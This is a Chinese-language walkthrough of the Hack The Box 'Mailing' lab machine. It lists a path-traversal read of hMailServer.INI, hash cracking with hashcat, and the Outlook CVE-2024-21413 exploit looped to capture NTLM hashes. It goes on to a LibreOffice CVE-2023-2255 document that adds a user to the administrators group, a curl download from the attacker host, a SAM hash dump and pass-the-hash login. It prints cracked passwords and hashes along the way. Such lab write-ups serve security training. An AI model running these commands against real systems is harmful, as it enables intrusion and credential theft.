# Mailing



![image-20240802150023577](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802150023577.png)

![image-20240802150038307](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802150038307.png)

没有22端口

```
ffuf -u http://mailing.htb/ -w /home/kali/Desktop/pass/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 4681,0 -t 128 -H "HOST: FUZZ.mailing.htb"
```

![image-20240802150415676](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802150415676.png)



![image-20240802152258004](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802152258004.png)

![image-20240802152504098](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802152504098.png)

download.php

![image-20240802151913789](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802151913789.png)

https://www.exploit-db.com/exploits/7012

```
curl http://mailing.htb/download.php?file=../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI
```

![image-20240802161420850](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802161420850.png)

```
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```





![image-20240802162158995](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802162158995.png)



```
hashcat.exe -m 0 '841bb5acfa6779ae432fd7a4e6600ba7' C:\Users\andi\PyHacker\rockyou.txt
```

![image-20240802162124254](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802162124254.png)

得到密码

```
homenetworkingadministrator
```

例外一个貌似...

![image-20240802163221722](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802163221722.png)

启动服务器

![image-20240802163730121](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802163730121.png)

poc(https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file)

```
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.16.23\test\meeting" --subject "XD"
```

![image-20240802164238810](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802164238810.png)



可能要多次发送，可以写个bash脚本

```
#!/bin/bash
README.md   repeat.sh*
num=0

while [ $num -lt 1000 ]; do
         python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.16.23\test\meeting" --subject "XD"
        sleep 3
         num=$((num+1))
done 
```

![image-20240802165812609](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802165812609.png)

最后在responder应该看到这样的回显

```
[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:95de498996a31a8c:D2BABC773FF653EE285D33E6FE5493A6:010100000000000080F2298488B6DA015D1DCBB264E2490C0000000002000800530059005500490001001E00570049004E002D005A004F0042005000340036004D0038004B005600410004003400570049004E002D005A004F0042005000340036004D0038004B00560041002E0053005900550049002E004C004F00430041004C000300140053005900550049002E004C004F00430041004C000500140053005900550049002E004C004F00430041004C000700080080F2298488B6DA0106000400020000000800300030000000000000000000000000200000C9E5BC0C7D84E948E12CF5D180E24C511C66B448EF8DB310790EDB6AD72669FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000
[*] Skipping previously captured hash for MAILING\maya
```

爆破密码

![image-20240802170041000](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802170041000.png)

```
 hashcat -m 5600 'maya::MAILING:95de498996a31a8c:D2BABC773FF653EE285D33E6FE5493A6:010100000000000080F2298488B6DA015D1DCBB264E2490C0000000002000800530059005500490001001E00570049004E002D005A004F0042005000340036004
D0038004B005600410004003400570049004E002D005A004F0042005000340036004D0038004B00560041002E0053005900550049002E004C004F00430041004C000300140053005900550049002E004C004F00430041004C000500140053005900550049002E004C004F0
0430041004C000700080080F2298488B6DA0106000400020000000800300030000000000000000000000000200000C9E5BC0C7D84E948E12CF5D180E24C511C66B448EF8DB310790EDB6AD72669FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000' /home/kali/pass/rockyou.txt
```

![image-20240802170227593](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802170227593.png)

得到密码

```
maya:m4y4ngs4ri
```

尝试登录

```
evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri
```

![image-20240802170433357](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802170433357.png)



```
type "C:\program files\libreoffice\readmes\readme_en-US.txt"
```

![image-20240802171246440](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802171246440.png)

LibreOffice 7.4存在cve(https://github.com/elweth-sec/CVE-2023-2255)

```
python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
```

![image-20240802171530307](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802171530307.png)

切换目录，上传exploit.odt

```
cd "C:\Important Documents\"
curl -o exploit.odt 10.10.16.23:9090/exploit.odt
```

![image-20240802173553261](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802173553261.png)

```
net users maya//查看用户组
```

![image-20240802172124817](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802172124817.png)



可以用checkmapexec得到administrator的hash

```
crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
SMB         10.10.11.14     445    MAILING          [+] Dumping SAM hashes
SMB         10.10.11.14     445    MAILING          Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.14     445    MAILING          Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.14     445    MAILING          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.14     445    MAILING          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::
SMB         10.10.11.14     445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
SMB         10.10.11.14     445    MAILING          maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::
SMB         10.10.11.14     445    MAILING          [+] Added 6 SAM hashes to the database
```

![image-20240802172935665](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240802172935665.png)

以管理员身份登录

```
impacket-wmiexec localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"
```

